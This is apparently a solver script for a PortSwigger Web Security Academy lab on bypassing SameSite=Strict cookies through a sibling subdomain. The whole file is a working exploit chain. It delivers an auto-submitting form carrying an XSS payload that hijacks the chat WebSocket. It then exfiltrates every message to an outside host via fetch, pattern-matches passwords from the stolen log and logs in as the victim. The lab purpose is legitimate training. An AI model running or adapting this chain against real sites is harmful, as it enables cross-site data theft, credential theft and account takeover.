#!/usr/bin/env python3
"""
SameSite Strict bypass via sibling domain
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 09-samesite-strict-sibling-domain.md

What this does:
    "Site" in SameSite means scheme + registrable domain (eTLD+1), so a
    sibling subdomain counts as the same site. The main app runs a live chat
    over WebSocket (wss://LABID.web-security-academy.net/chat) authorized
    only by the SameSite=Strict session cookie during the handshake -- a
    cross-site WebSocket hijacking (CSWSH) candidate that Strict normally
    blocks. The sibling cms-LABID.web-security-academy.net reflects its
    login form's username straight back unescaped -- on this target instance
    only on a POST submission, not a GET. Exactly like
    lab_samesite_strict_sibling() in CSRF.py: derive the sibling domain,
    confirm its login page responds, deliver an auto-submitting POST form
    whose username field carries a WebSocket-hijack script, let it run, pull
    the exploit server's access log, decode the exfiltrated chat messages,
    pattern-match them for credential phrasing, and log in as the victim with
    whatever was recovered.

Usage:
    python 09-samesite-strict-sibling-domain.py <lab-url>

Requirements:
    pip install httpx
"""

import base64
import re
import sys
import time
import httpx


def _get_csrf(client: httpx.Client, path: str = "/login") -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search(r'name=csrf\s+value=([^\s>]+)', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, username: str, password: str) -> bool:
    csrf = _get_csrf(client, "/login")
    r = client.post("/login", data={"csrf": csrf, "username": username, "password": password})
    return r.status_code < 400 and "Log out" in r.text


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def _exploit_server_logs(exploit_url: str) -> str:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "formAction": "ACCESS_LOG",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "responseBody": "",
        })
    return r.text


def extract_credentials_from_logs(log_text: str) -> dict:
    """Decode base64 msg= values from exfiltrated WebSocket chat and pattern-match for creds."""
    b64_msgs = re.findall(r'msg=([A-Za-z0-9+/=]+)', log_text)
    username = ""
    password = ""

    for b64 in b64_msgs:
        try:
            decoded = base64.b64decode(b64).decode('utf-8', errors='replace')
            pw_m = re.search(r'password\s*(?:is|:)\s*(\S+)', decoded, re.IGNORECASE)
            pw_m2 = re.search(r"it(?:'|&apos;)s\s+([\w]+)", decoded, re.IGNORECASE)
            un_m = re.search(r'username\s*(?:is|:)\s*(\S+)', decoded, re.IGNORECASE)
            un_m2 = re.search(r'No problem\s+(\w+)', decoded, re.IGNORECASE)

            if pw_m and not password:
                password = pw_m.group(1)
            elif pw_m2 and not password:
                password = pw_m2.group(1)
            if un_m and not username:
                username = un_m.group(1)
            elif un_m2 and not username:
                username = un_m2.group(1)
        except Exception:
            pass

    return {"username": username or "carlos", "password": password}


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    domain = lab_url.split("//")[1].split("/")[0]
    lab_id = domain.split(".")[0]
    sibling_url = f"https://cms-{lab_id}.web-security-academy.net"
    ws_url = f"wss://{domain}/chat"
    print(f"[*] Sibling: {sibling_url}, WS: {ws_url}")

    with httpx.Client(follow_redirects=True, timeout=10) as c:
        r = c.get(f"{sibling_url}/login")
        if r.status_code != 200:
            print(f"[-] Sibling login page not found ({r.status_code}).")
            return
    print("[*] Sibling login page confirmed.")

    ws_script = (
        "<script>"
        "var ws=new WebSocket('" + ws_url + "');"
        "ws.onopen=function(){ws.send('READY');};"
        "ws.onmessage=function(e){"
        "fetch('" + exploit_url + "/log?msg='+btoa(e.data));"
        "};"
        "</script>"
    )
    html = (
        '<html><body>\n'
        '<form method="POST" action="' + sibling_url + '/login">\n'
        '  <input type="hidden" name="username" value="' + ws_script + '" />\n'
        '  <input type="hidden" name="password" value="anything" />\n'
        '</form>\n'
        '<script>document.forms[0].submit();</script>\n'
        '</body></html>'
    )
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    print("[*] Technique: SameSite Strict: sibling XSS -> CSWSH -> credential exfiltration")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(12)

    logs = _exploit_server_logs(exploit_url)
    creds = extract_credentials_from_logs(logs)
    print(f"[*] Extracted: {creds['username']}:{creds['password']}")

    if not creds["password"]:
        print("[-] Could not extract a password from the exfiltrated chat history.")
        return

    _login(client, creds["username"], creds["password"])
    time.sleep(2)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- logged in as the victim using credentials exfiltrated over the hijacked WebSocket.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
